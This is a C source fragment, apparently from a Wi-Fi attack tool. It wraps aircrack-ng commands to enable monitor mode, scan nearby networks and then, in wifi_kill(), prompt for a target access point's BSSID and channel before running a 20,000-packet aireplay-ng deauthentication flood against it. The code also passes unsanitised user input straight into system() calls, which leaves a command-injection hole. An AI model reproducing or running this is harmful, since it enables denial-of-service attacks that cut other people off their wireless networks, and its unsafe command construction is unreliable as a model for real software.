wifi(int c) 								//WIFI
{
	FILE *wlan;

	 char wlan_n[1000],w_n[100];
	 wlan=fopen("wlan_name.txt","r");		//opening file to read mode	wlanmon name
				  fscanf(wlan,"%s",wlan_n);
	
		fclose(wlan);		
		 if(c==0)					// ENABLE WIFI BACK
		{
			system("service networking restart");
			system("service network-manager restart");
			delay(990000);
			clear;
			 
			
		}
		else if (c==1)				// Wlan Monitor START
		{
			strcpy(wlan_n,"wlan0");
			  sprintf(w_n,"airmon-ng start %s",wlan_n);
			system(w_n);
			system("airmon-ng check kill");
			delay(990000);
			clear;
			 
		}
		else if (c==10) 			//// Wlan Monitor STOP
		{
			 sprintf(w_n,"airmon-ng stop %s",wlan_n);
				system(w_n);
			delay(990000);
			clear;
		}
		else if(c==9)
		{
			sprintf(w_n,"airodump-ng  %s",wlan_n);
			puts(BGRN);
			system(w_n); 
			clear;
		}
	}
	

wifi_kill()
{
	char bssid[100],dea[100];
	int c;
	 FILE *wlan;
	 char wlan_n[1000];
	wlan=fopen("wlan_name.txt","r");		//opening file to read mode	wlanmon name
		
	fscanf(wlan,"%s",wlan_n);
	
	 sprintf(dea,"  airodump-ng %s",wlan_n);
	system(dea);
	puts("Enter the bssid of the TARGET");
	scanf("%s",&bssid);
	puts("enter the Channel of the TARGET");
	scanf("%d",&c);
 
	
	 sprintf(dea,"xterm -e timeout 1 airodump-ng --bssid %s -c %d %s",bssid,c,wlan_n);
	//sprintf(dea,"nmap");
	 system(dea);
		 
		 sprintf(dea,"aireplay-ng -0 20000 -a %s  wlan0mon",bssid ); puts(BGRN); system(dea); puts(RESET);
		 fclose(wlan);
		
}
